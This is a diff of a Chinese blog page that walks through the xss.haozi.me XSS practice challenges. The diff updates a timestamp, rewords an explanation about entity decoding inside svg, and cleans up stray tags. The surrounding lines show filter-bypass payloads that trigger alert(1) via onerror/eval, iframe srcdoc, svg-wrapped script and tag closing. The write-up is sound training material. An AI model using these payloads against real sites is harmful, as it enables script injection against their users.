@@ -14,7 +14,7 @@
 <meta property="og:site_name" content="Mi1k7ea">
 <meta property="og:description" content="背景这里写下haozi大佬的XSS闯关练习笔记，题目网址为https://xss.haozi.me/，项目地址为https://github.com/haozi/xss-demo，注意这里有一个自带alert(1)的js地址：https://xss.haozi.me/j.js。 0x00关键源码： 123function render (input) &amp;#123;  return &apos;&amp;lt;div">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-16T05:41:24.781Z">
+<meta property="og:updated_time" content="2019-02-16T05:46:32.433Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS闯关之xss.haozi.me">
 <meta name="twitter:description" content="背景这里写下haozi大佬的XSS闯关练习笔记，题目网址为https://xss.haozi.me/，项目地址为https://github.com/haozi/xss-demo，注意这里有一个自带alert(1)的js地址：https://xss.haozi.me/j.js。 0x00关键源码： 123function render (input) &amp;#123;  return &apos;&amp;lt;div">
@@ -191,7 +191,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">'=alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>1、利用js窗口事件发生错误执行弹框，其中进行了Unicode编码。</p>
 <p>2、利用HTML5中iframe的特点，其srcdoc属性里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的HTML片段。</p>
-<p>3、payload前面不能没有\<svg>标签，在\<svg>标签中可以直接执行实体字符即HTML转义字符，否则不会解码\<script>标签内的编码内容。</p>
+<p>3、在svg标签中可以直接执行实体字符即HTML转义字符，否则不会解码\<script>标签内的编码内容。</p>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>关键源码：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>过滤了–&gt;，并将输入放入注释中间。但是，</p>
@@ -284,7 +284,7 @@
 <p>另外，由于解析HTML标签的优先级高于解析JS的优先级，因此也可以直接闭合标签：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span><br></pre></td></tr></table></figure>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次的练习多是针对正则的绕过，学到一些新姿势，推荐练习。</p>
-</script></svg></svg></p>
+</script></p>
   </div>
 </article>
 
